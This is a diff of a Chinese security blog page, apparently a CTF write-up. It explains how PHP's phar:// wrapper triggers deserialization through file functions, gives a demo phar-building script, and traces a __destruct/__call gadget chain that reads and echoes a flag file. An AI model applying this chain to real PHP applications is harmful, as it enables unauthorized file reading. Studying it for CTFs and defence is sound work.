@@ -1,166 +1,14 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="在以往的认知中，PHP反序列化漏洞都至少需要unserialize()函数存在，不然我们是没法利用的。其实不然，利用phar:&#x2F;&#x2F;伪协议也可以完成反序列化漏洞利用。 何为phar？简单来说，phar是PHP提供的一种压缩和归档的方案，并且还提供了各种处理它的方法。 一个phar文件由四部分组成，分别是:  stub.即用来标识phar 文件的部分，类似图片头。格式为xxx&lt;?php xxx;">
-<meta property="og:type" content="article">
-<meta property="og:title" content="利用phar伪协议进行反序列化攻击">
-<meta property="og:url" content="https://eviladan0s.github.io/2020/03/14/php_phar/index.html">
-<meta property="og:site_name" content="白袍的小行星">
-<meta property="og:description" content="在以往的认知中，PHP反序列化漏洞都至少需要unserialize()函数存在，不然我们是没法利用的。其实不然，利用phar:&#x2F;&#x2F;伪协议也可以完成反序列化漏洞利用。 何为phar？简单来说，phar是PHP提供的一种压缩和归档的方案，并且还提供了各种处理它的方法。 一个phar文件由四部分组成，分别是:  stub.即用来标识phar 文件的部分，类似图片头。格式为xxx&lt;?php xxx;">
-<meta property="og:locale" content="zh">
-<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200316-182841@2x.png">
-<meta property="article:published_time" content="2020-03-14T12:45:48.000Z">
-<meta property="article:modified_time" content="2020-03-17T05:37:33.960Z">
-<meta property="article:author" content="白袍">
-<meta property="article:tag" content="安全研究">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://eviladan0s.github.io/images/WX20200316-182841@2x.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>利用phar伪协议进行反序列化攻击</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-      
-<link rel="stylesheet" href="/css/rtl.css">
-
-    
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/atom.xml" title="白袍的小行星" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/search/">Search</a></li>
-         
-          <li><a href="https://github.com/evilAdan0s" target="_blank" rel="noopener">Projects</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2020/03/17/php-chanllenge/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2020/03/12/cmd_arg/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://eviladan0s.github.io/2020/03/14/php_phar/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://eviladan0s.github.io/2020/03/14/php_phar/&text=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://eviladan0s.github.io/2020/03/14/php_phar/&is_video=false&description=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=利用phar伪协议进行反序列化攻击&body=Check out this article: https://eviladan0s.github.io/2020/03/14/php_phar/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://eviladan0s.github.io/2020/03/14/php_phar/&title=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://eviladan0s.github.io/2020/03/14/php_phar/&name=利用phar伪协议进行反序列化攻击&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://eviladan0s.github.io/2020/03/14/php_phar/&t=利用phar伪协议进行反序列化攻击" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#何为phar？"><span class="toc-number">1.</span> <span class="toc-text">何为phar？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击方法"><span class="toc-number">3.</span> <span class="toc-text">攻击方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-8 分钟后你将读完本篇文章.
-    
-    <h1 class="posttitle" itemprop="name headline">
-        利用phar伪协议进行反序列化攻击
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">白袍的小行星</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2020-03-14T12:45:48.000Z" itemprop="datePublished">2020-03-14</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" rel="tag">安全研究</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <p>在以往的认知中，PHP反序列化漏洞都至少需要<code>unserialize()</code>函数存在，不然我们是没法利用的。其实不然，利用<code>phar://</code>伪协议也可以完成反序列化漏洞利用。</p>
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="利用phar伪协议进行反序列化攻击"><meta name="keywords" content="安全研究"><meta name="author" content="白袍"><meta name="copyright" content="白袍"><title>利用phar伪协议进行反序列化攻击 | 白袍的小行星</title><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="白袍的小行星" type="application/atom+xml">
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#何为phar？"><span class="toc-number">1.</span> <span class="toc-text">何为phar？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击方法"><span class="toc-number">3.</span> <span class="toc-text">攻击方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/57424ce0a622b132.jpg"></div><div class="author-info__name text-center">白袍</div><div class="author-info__description text-center">莫忘少年凌云志，曾许天下第一流！</div><div class="follow-button"><a href="https://github.com/evilAdan0s" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">11</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://www.d-rose.cn/" target="_blank" rel="noopener">D-R0s1</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/back.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">白袍的小行星</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">利用phar伪协议进行反序列化攻击</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-17</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>在以往的认知中，PHP反序列化漏洞都至少需要<code>unserialize()</code>函数存在，不然我们是没法利用的。其实不然，利用<code>phar://</code>伪协议也可以完成反序列化漏洞利用。</p>
 <h1 id="何为phar？"><a href="#何为phar？" class="headerlink" title="何为phar？"></a>何为phar？</h1><p>简单来说，<code>phar</code>是PHP提供的一种压缩和归档的方案，并且还提供了各种处理它的方法。</p>
 <p>一个phar文件由四部分组成，分别是:</p>
 <ol>
@@ -174,31 +22,8 @@
 <p>原因就在于phar在处理用户自定义的<code>meta-data</code>时，会进行序列化后存储，而使用某些文件函数通过<code>phar://</code>解析phar文件的时候会进行反序列化。</p>
 </blockquote>
 <p>我们来测试一下：（测试时要在<code>php.ini</code>中设置<code>phar.readonly = Off</code>）</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-  <span class="token comment" spellcheck="true">//创建并写入phar文件</span>
-  <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
-  <span class="token keyword">public</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">"Hello World"</span><span class="token punctuation">;</span>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//创建并写入phar文件</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $test = <span class="string">"Hello World"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'unserialize!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">	unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">	$phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>); </span><br><span class="line">  $phar-&gt;startBuffering();</span><br><span class="line">  $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); </span><br><span class="line">  $test = <span class="keyword">new</span> Test();</span><br><span class="line">  $phar-&gt;setMetadata($test); </span><br><span class="line">  $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); </span><br><span class="line">  $phar-&gt;stopBuffering();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'创建完成'</span> . <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//读取</span></span><br><span class="line">	$filename = <span class="string">'phar://test.phar/test.txt'</span>;</span><br><span class="line">  file_get_contents($filename);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token keyword">echo</span> <span class="token string">'unserialize!'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-  <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-  <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">'创建完成'</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
-
-
-    <span class="token comment" spellcheck="true">//读取</span>
-    <span class="token variable">$filename</span> <span class="token operator">=</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//test.phar/test.txt';</span>
-  <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>结果如图：</p>
 <p><img src="/images/WX20200316-182841@2x.png" alt=""></p>
 <p>这里使用了<code>file_get_contents()</code>来处理，实际还有很多文件函数如<code>unlink()</code>、<code>copy()</code>等也受到影响。</p>
@@ -213,257 +38,35 @@
 <p><strong>目标：读取flag</strong></p>
 <p><strong>条件：一个触发phar反序列化的文件函数，一个可以被触发的方法</strong></p>
 <p>危险的文件函数已经找到了，就在<code>File</code>类的<code>close()</code>方法里：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
 <p>这个函数会读取文件内容，就用它来拿flag.</p>
 <p>再看其他类，发现<code>User</code>类里有一处调用了<code>close()</code>方法：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
 <p>现在我们可以读取flag了，但是无法输出，所以我们也就看不到。</p>
 <p>再继续找能输出的地方，这就看到了<code>FileList</code>类的<code>__destruct()</code>方法：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>
-        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>
-        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>
-        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>
-        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>
-            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>
-            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
 <p>此方法会将<code>results</code>进行输出，好，我们接下来要将读取的结果存储到<code>results</code>里。</p>
 <p>完成这一任务的是<code>FileList</code>类的<code>__call()</code>方法，它调用了对象<code>$file</code>的<code>open()</code>方法，并将内容存储到<code>results</code>中：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
 <p><code>_call()</code>方法会在对象上下文中调用不可访问的方法时触发。</p>
 <p>所以攻击路径就是这样：我们利用<code>User</code>类的<code>__destruct()</code>的方法，来调用<code>FileList</code>类中不存在的<code>close()</code>方法，这样就会触发<code>FileList</code>类的<code>__call()</code>方法，在<code>__call()</code>方法中调用<code>File</code>类的<code>close()</code>方法读取flag文件，最后由<code>FileList</code>类调用<code>__destruct()</code>输入flag.</p>
 <p>也许你对<code>__call()</code>如何调用了<code>close()</code>还有疑问，再做一点解释。</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token function">__call</span> <span class="token punctuation">(</span> string <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$arguments</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> __call ( string $name , <span class="keyword">array</span> $arguments )</span><br></pre></td></tr></table></figure>
+
